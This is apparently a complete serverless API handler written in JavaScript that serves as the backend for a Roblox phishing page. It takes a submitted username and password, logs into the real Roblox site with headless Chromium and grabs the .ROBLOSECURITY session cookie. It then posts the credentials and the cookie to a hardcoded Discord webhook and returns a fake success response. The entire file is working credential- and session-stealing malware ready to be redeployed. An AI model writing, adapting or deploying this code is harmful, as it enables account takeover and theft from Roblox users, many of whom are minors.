import puppeteer from 'puppeteer-core';
import chromium from '@sparticuz/chromium';

export const config = {
  api: {
    bodyParser: true,
  },
};

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  const { user, pass } = req.body;
  const webhook = 'https://discord.com/api/webhooks/1445135996541997319/m1OTOwU8ik-uLCzuLm8sXmpzfWAPtVAKGZE_CSEATIWm1EVvhi3DXkh8tCorNNormjG0'; // CHANGE THIS

  try {
    const browser = await puppeteer.launch({
      args: chromium.args,
      defaultViewport: chromium.defaultViewport,
      executablePath: await chromium.executablePath(),
      headless: chromium.headless,
    });

    const page = await browser.newPage();
    await page.goto('https://www.roblox.com/login');

    await page.type('#login-username', user);
    await page.type('#login-password', pass);
    await page.click('#login-button');

    // Wait for either dashboard or 2FA
    await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 }).catch(() => {});

    const cookies = await page.cookies();
    const robloxCookie = cookies.find(c => c.name === '.ROBLOSECURITY')?.value || "Failed to grab";

    await browser.close();

    // Send to webhook
    await fetch(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "New Roblox Cookie",
          color: 0x00ff9d,
          fields: [
            { name: "Username", value: user, inline: true },
            { name: "Password", value: `||${pass}||`, inline: true },
            { name: "Cookie Length", value: robloxCookie.length > 50 ? "Valid" : "Invalid", inline: true },
            { name: "Cookie", value: "```" + robloxCookie.substring(0, 500) + "```" }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    });
  } catch (e) {
    console.log(e);
  }

  res.status(200).json({ success: true });
}
